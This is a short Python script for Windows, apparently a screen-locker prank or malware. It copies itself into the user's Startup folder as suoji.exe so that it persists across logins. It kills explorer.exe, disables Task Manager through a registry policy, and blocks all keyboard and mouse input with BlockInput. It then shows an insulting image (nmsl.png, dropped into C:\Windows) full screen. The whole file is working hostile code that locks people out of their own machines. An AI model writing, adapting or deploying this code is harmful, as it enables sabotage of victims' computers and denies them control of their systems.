import sys
import os
import win32api
import win32con
from ctypes import *
filename=sys.argv[0]
file1=r"C:\Users\{0}\AppData\Roaming\Microsoft\Windows\{1}\Programs\Startup".format(os.getlogin(),'Start Menu')
def main():
    os.system('taskkill /f /im explorer.exe & REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f')
    ok = windll.user32.BlockInput(True)
    import cv2
    img = cv2.imread(r"C:\Windows\nmsl.png")     
    out_win = "output_style_full_screen"
    cv2.namedWindow(out_win, cv2.WINDOW_NORMAL)
    cv2.setWindowProperty(out_win, cv2.WND_PROP_FULLSCREEN, cv2.WINDOW_FULLSCREEN)
    cv2.imshow(out_win, img)
    cv2.waitKey(0) 
if os.getcwd()!=file1 :
    if 'nmsl.png' not in os.listdir('C:\Windows'):
        try:
            with open('main.nm','rb') as h:
                hr=h.read()
                with open('C:\Windows\\nmsl.png','wb') as h2:
                    h2.write(hr)
        except FileNotFoundError:
            win32api.MessageBox(0, "没有找到main.nm文件", "错误", win32con.MB_ICONERROR)
            sys.exit()
    with open(filename,'rb') as f:
        read=f.read()
        with open(file1+r'\suoji.exe','wb') as f2:
            f2.write(read)        
    main()        
else:
    main()

